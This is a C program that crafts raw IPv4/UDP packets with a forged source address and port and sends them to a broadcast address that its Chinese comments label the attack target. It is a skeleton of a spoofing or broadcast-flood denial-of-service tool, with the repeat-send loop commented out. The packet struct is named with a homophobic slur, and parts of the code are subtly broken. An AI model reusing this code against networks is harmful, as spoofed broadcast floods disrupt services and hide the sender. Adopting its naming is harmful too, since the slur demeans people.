#include <stdio.h>
#include <sys/socket.h>
#include <unistd.h>
#include <netinet/ip.h> //ip
#include <netinet/udp.h> //tcp
#include <stdlib.h>
#include<netinet/in.h>

unsigned short ip_sum(unsigned short *addrr2, int len2) {
    register unsigned short *addrr = addrr2;
    register int len = len2;
    register int sum = 0;
    unsigned short answer = 0;

    while (len > 1) {
        sum += *addrr++;
        len -= 2;
    }
    if (len == 1) {
        *(unsigned char *) (&answer) = *(unsigned char *) addrr;
        sum += answer;
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = ~sum;
    return (answer);
}

unsigned short cksum(short * buf, int nwords) {
    unsigned long sum;
    for (sum = 0; nwords > 0; nwords--)
        sum += *buf++;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return ~sum;
}

int main(int argc, char *argv[]) {
    int sock, size, bytes_send, psize;
    psize = 0;
    struct sockaddr_in sin;

    struct {
        struct ip iphead;
        struct udphdr udphead;
        unsigned char evil[];
    } faggot;

    size = sizeof(struct ip) + sizeof(struct udphdr) + 1 + psize;

    printf("create socket\r\n");
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = inet_addr("192.168.0.255"); //被攻击者ip
    sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &size, sizeof(size)) < 0) {
        printf("2");
        perror("IP_HDRINCL");
        exit(1);
    }

    const int on = 1;//设定常量，用于打开广播模式
    //设定该接口上的广播模式
    if (setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &on, sizeof(on)) < 0) {
        printf("2");
        perror("IP_HDRINCL");
        exit(1);
    }

    faggot.evil[psize] = '\0';

    printf("create iphead\r\n");
    faggot.iphead.ip_v = 4;
    faggot.iphead.ip_hl = 5;
    faggot.iphead.ip_tos = 0x00;
    faggot.iphead.ip_len = size;
    faggot.iphead.ip_id = 1025;
    faggot.iphead.ip_off = 0;
    faggot.iphead.ip_ttl = 201;
    faggot.iphead.ip_p = IPPROTO_UDP;
    faggot.iphead.ip_sum = 0;
    inet_aton("192.168.0.157", &faggot.iphead.ip_src);//假冒ip
    inet_aton("192.168.0.255", &faggot.iphead.ip_dst);//被攻击者ip

    printf("create udphead\r\n");
    faggot.udphead.source = htons(12345);//假冒端口
    faggot.udphead.dest = htons(80);//被攻击者端口
    faggot.udphead.len = htons(sizeof(faggot.udphead) + 1 + psize);

    faggot.iphead.ip_sum = ip_sum((short *) &(faggot.iphead), sizeof(faggot.iphead));
    faggot.udphead.check = cksum((short *) &(faggot.udphead), size >> 1);

    printf("start send\r\n");
    int i = 1;
    while (i > 0) {
        bytes_send = sendto(sock, &faggot, size, 0, (struct sockaddr *) &sin, sizeof(sin));
        i--;
        //		if (bytes_send > 0) {
        //			i++;
        //			printf("第%d次OK bytes_send udp %d \n", i, bytes_send);
        //		}
    }
    printf("end send\r\n");
}
